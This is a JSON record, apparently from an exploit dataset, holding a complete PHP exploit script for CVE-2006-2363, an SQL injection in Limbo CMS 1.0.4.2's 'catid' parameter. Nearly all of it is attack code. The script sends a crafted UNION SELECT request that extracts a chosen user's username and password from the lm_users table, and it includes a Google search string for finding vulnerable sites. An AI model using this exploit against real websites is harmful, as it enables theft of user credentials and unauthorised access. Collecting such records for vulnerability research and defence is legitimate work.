{
  "id": "1751",
  "title": "Limbo CMS 1.0.4.2 - &#039;catid&#039; SQL Injection",
  "cve": "CVE-2006-2363",
  "vuln_type": "sqli",
  "code": "<pre>\r\n[i] Limbo CMS (option=weblinks) sql injection exploit\r\n[i] coded by [Oo]\r\n<?php\r\n\r\nif( (!isset($_GET['host'])) || (!isset($_GET['path'])) || (!isset($_GET['id'])))\r\n{\r\n?>\t\r\n[*] Usage: <?echo htmlentities($PHP_SELF)?>?host=[hostname]&path=[limbo_path]&id=[user_id]\r\n[*] Exemple: <?echo htmlentities($PHP_SELF)?>?host=127.0.0.1&path=/limbo&id=1\r\n\r\n[g] Google: inurl:\"index2.php?option=rss\" OR \"powered By Limbo CMS\"\t\r\n<?php\r\ndie;\r\n}\r\n\r\n$host = $_GET['host'];\r\n$path = $_GET['path'];\r\n$id = $_GET['id'];\r\n\r\n$success = 0;\r\n\r\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\r\nif (!$fp) {\r\n   die(\"[-] Connection Error!\");\r\n} \r\nelse {\r\n\r\n   $out = \"GET $path/index.php?option=weblinks&Itemid=44&catid=-1%20union%20select%200,1,2,concat(char(0x6c,0x6f,0x67,0x69,0x6e,0x3a),username,char(0x20,0x70,0x61,0x73,0x73,0x77,0x6f,0x72,0x64,0x3a),password),4,5,6,7,8,9,10,11%20from%20lm_users%20where%20id=$id/* HTTP/1.1\\r\\n\";\r\n   $out .= \"Host: $host\\r\\n\";\r\n   $out .= \"Connection: Close\\r\\n\\r\\n\";\r\n\r\n   fwrite($fp, $out);\r\n   while (!feof($fp)) {\r\n\t   $f = fgets($fp, 1024);\r\n       if ( (preg_match(\"/<div class=\\\"componentheading\\\" >/\",$f)) && (preg_match(\"/login/\",$f)) )\r\n       {\r\n\t\t\techo \"$f\";\r\n\t\t\techo \"[+] Enjoy! :><br>\";\r\n\t\t\t$success = 1;\r\n\t   }\r\n   }\r\n   fclose($fp);\r\n   \r\n   if (!$success)\r\n\techo \"<br>[-] exploit failed :<<br>\";\r\n}\r\n?> \r\n</pre>\r\n\r\n# milw0rm.com [2006-05-05]",
  "url": "https://www.exploit-db.com/exploits/1751"
}